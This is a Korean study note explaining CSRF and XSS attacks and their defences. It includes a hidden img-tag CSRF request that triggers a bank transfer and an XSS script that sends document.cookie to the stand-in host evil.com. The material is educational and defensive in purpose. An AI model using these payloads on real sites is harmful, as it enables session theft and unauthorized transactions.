# 4. CSRF

---

## 0. CSRF, XSS

웹 보안에서 흔히 발생하는 두 가지 주요 공격 유형

## 1. CSRF란?

### 정의 / 특징

- Cross-Site Request Forgery
- 이미 인증된 웹사이트에 대해 사용자의 의도와는 무관하게 악의적인 요청을 발생시키는 공격
- 쿠키의 자동 전송 특성을 악용한 공격

### 작동 방식

1. 사용자가 정상 웹사이트에 로그인하여 인증 토큰(예: 쿠키)을 받음
2. 사용자가 다른 탭이나 창에서 악성 웹사이트 방문
3. 악성 웹사이트에는 정상 웹사이트에 요청을 보내는 이미지, 링크, 자바스크립트 등을 포함시켜, 사용자가 요청을 보내도록 유도
4. 사용자의 브라우저는 이 요청을 자동으로 인증 토큰과 함께 보내게 되어, 원래 사이트는 이를 정상적인 사용자의 요청으로 인식

### 작동 예시

1. **사용자 로그인**:
    - 사용자가 `mybank.com`에 로그인하고, 온라인 뱅킹 서비스를 이용합니다.
    - 로그인 성공 시, 사용자의 브라우저에는 `mybank.com`으로부터 인증 쿠키가 저장됩니다.
2. **악성 웹사이트 방문**:
    - 사용자가 `mybank.com`에 로그인한 상태로, 별도의 탭에서 악성 웹사이트 `evil.com`을 방문합니다.
    - `evil.com`에는 다음과 같은 HTML 코드가 있습니다:

        ```html
        <img src="https://mybank.com/transfer?to=attacker&amount=1000" width="0" height="0">
        ```

    - 이 코드는 `mybank.com`에 자금 이체를 요청하는 이미지를 불러오는 것처럼 보입니다.
3. **악성 요청 전송**:
    - 사용자의 브라우저는 `evil.com`에 있는 이미지를 불러오려고 시도합니다.
    - 이 과정에서 `mybank.com`으로 돈을 이체하는 요청이 포함된 "이미지"를 불러오게 됩니다.
    - 사용자의 브라우저는 이미 `mybank.com`에 인증된 상태이므로, 이 요청은 사용자가 인증된 것처럼 처리됩니다.
4. **결과**:
    - `mybank.com`은 이 요청이 사용자로부터 온 것으로 인식하고, 공격자가 지정한 계좌로 1000달러를 이체합니다.

### 예방 방법

**사용자 차원**

- 사용하지 않는 웹 애플리케이션 로그아웃
- 여러 웹사이트 동시 사용 자제

**서버 차원**

- referer check
    - HTTP request header에서 referer 정보 확인 가능
    - 일반적으로 host와 referer 값이 일치
    - referer check만으로도 많은 공격을 방어할 수 있음
- SameSite 쿠키 속성 설정
    - 쿠키가 동일 출처 요청에만 포함되도록 함
- CSRF 토큰 사용
    - 서버에 들어온 요청이 실제 서버에서 허용한 요청이 맞는지 확인하기 위한 토큰
- 사용자의 중요한 결정에 대한 추가적인 인증 요구
    - 비밀번호 변경이나 중요한 정보 업데이트 시 추가적인 인증 절차 요구

## 2. XSS란?

### 정의 / 특징

- Cross-Site Scripting
- 공격자가 웹 페이지에 악성 스크립트를 주입하여 사용자의 브라우저에서 실행되게 만드는 공격

### 작동 방식

1. 공격자는 악성 스크립트를 포함한 데이터를 웹 애플리케이션에 입력
2. 이 악성 데이터는 서버에서 필터링 또는 이스케이프 처리 없이 다른 사용자에게 전달
3. 다른 사용자의 브라우저가 이 데이터를 받아들이고, 내장된 스크립트가 실행
4. 이 스크립트는 사용자의 쿠키, 세션 토큰을 탈취하거나, 사용자를 대신하여 악의적인 행동을 수행할 수 있음

### 작동 예시

**예시 시나리오: 블로그 웹사이트의 댓글 섹션**

상황: `exampleblog.com`은 사용자들이 글을 읽고 댓글을 달 수 있는 블로그 사이트입니다.

**1단계: 악성 스크립트 작성**

- 공격자는 `exampleblog.com`의 특정 글에 댓글을 답니다.
- 이 댓글에는 다음과 같은 악성 JavaScript 코드가 포함되어 있습니다:

    ```html
    <script>
      var cookies = document.cookie;
      fetch('https://evil.com/steal?cookies=' + cookies);
    </script>
    ```


**2단계: 블로그 사이트의 취약점**

- `exampleblog.com`은 사용자가 작성한 댓글을 필터링 하거나 적절히 이스케이프 처리하지 않습니다.
- 결과적으로, 공격자가 작성한 댓글이 그대로 블로그에 게시됩니다.

**3단계: 악성 스크립트 실행**

- 다른 사용자가 해당 글을 방문할 때, 페이지에 포함된 악성 스크립트가 그들의 브라우저에서 실행됩니다.
- 실행된 스크립트는 사용자의 쿠키를 탈취하고, 이를 `evil.com`의 서버로 전송합니다.

**4단계: 정보 탈취**

- `evil.com`은 전송된 쿠키를 받아 사용자의 세션 정보를 탈취합니다.
- 이 정보를 사용하여 공격자는 `exampleblog.com`에서 해당 사용자의 계정으로 로그인할 수 있습니다.

### 예방 방법

- HTML, JavaScript, CSS에서 안전하지 않은 문자를 이스케이프 처리
- `CSP`를 설정하여, 승인되지 않은 출처의 스크립트 실행 차단
    - CSP(컨텐츠 보안정책): 교차 사이트 스크립팅([XSS](https://developer.mozilla.org/ko/docs/Glossary/Cross-site_scripting))과 데이터 주입 공격을 비롯한 특정 유형의 공격을 탐지하고 완화하는 데 도움이 되는 추가 보안 계층
    - HTTP 헤더 설정

        ```
        	Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com; style-src 'self' 'unsafe-inline'; img-src 'self' https://images.example.com;
        ```

- 쿠키에 **`HttpOnly`** 속성을 설정하여 JavaScript를 통한 접근 방지
    - HttpOnly 속성이 설정된 쿠키는 JavaScript를 통해 직접 접근 불가
    - 즉, document.cookie API를 사용하여 이러한 쿠키를 읽거나 수정하는 것이 불가능